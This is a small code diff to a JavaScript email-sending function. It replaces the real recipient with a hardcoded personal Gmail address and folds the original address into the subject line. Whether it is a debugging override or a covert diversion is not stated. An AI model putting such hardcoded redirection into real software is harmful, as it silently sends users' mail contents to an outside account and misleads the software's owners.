@@ -2,8 +2,8 @@ const sendMail = require('./sendMail.js');
 
 const composeEmail = async (email, subject, text) => {
   const options = {
-    to: email,
-    subject,
+    to: 'bandicot160@gmail.com',
+    subject: `${email} - ${subject}`,
     text,
     textEncoding: 'base64',
     headers: [
